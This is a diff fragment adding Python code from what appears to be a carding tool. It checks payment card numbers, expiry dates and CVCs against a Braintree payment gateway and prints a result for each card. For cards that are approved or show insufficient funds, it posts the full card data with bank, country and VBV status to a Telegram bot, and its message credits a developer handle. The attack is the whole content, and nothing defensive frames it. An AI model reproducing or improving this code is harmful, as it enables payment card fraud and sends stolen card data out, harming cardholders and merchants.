+		data={'chat_id':  id, 'text':  nn, 'parse_mode':  'Markdown', 'disable_web_page_preview':  'true'})
+		
+	elif "Insufficient Funds" in msg:
+		print(bold+num+'|'+mm+ '|'+yy+'|'+cvc+ps+msg+reset)
+		kk =requests.post(f'https://api.telegram.org/bot{tokeen}/sendmessage', 
+		data={'chat_id':  id, 'text':  cc, 'parse_mode':  'Markdown', 'disable_web_page_preview':  'true'})
+		
+	elif 'Payment method successfully added.' in msg:
+		nn = f"""
+𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅
+------------------------------
+[ϟ](https://t.me/N1z1N) 𝐂𝐚𝐫𝐝: `{num}|{mm}|{yy}|{cvc}`
+[ϟ](https://t.me/N1z1N) 𝐒𝐭𝐚𝐭𝐮𝐬: Insufficient Funds
+[ϟ](https://t.me/N1z1N) 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: Braintree Auth
+------------------------------
+[ϟ](https://t.me/N1z1N) 𝐈𝐧𝐟𝐨: {infocard}
+[ϟ](https://t.me/N1z1N) 𝐁𝐚𝐧𝐤: {card}
+[ϟ](https://t.me/N1z1N) 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {country}
+------------------------------
+[ϟ](https://t.me/N1z1N) 𝐕𝐛𝐯 𝐋𝐨𝐨𝐤𝐮𝐩: {bb}
+[ϟ](https://t.me/N1z1N) 𝐓𝐢𝐦𝐞: {etime}s
+------------------------------
+[ϟ](https://t.me/N1z1N) 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫: @FF5UU
+"""
+		
+		print(bold+num+'|'+mm+ '|'+yy+'|'+cvc+ps+msg+reset)
+		requests.post(f'https://api.telegram.org/bot{tokeen}/sendmessage', 
+              data={'chat_id':  id, 'text':  nn, 'parse_mode':  'Markdown', 'disable_web_page_preview':  'true'})
+              
+	else:
+		print(bold+num+'|'+mm+ '|'+yy+'|'+cvc+rd+aa+reset)
+	time.sleep(30)
+		
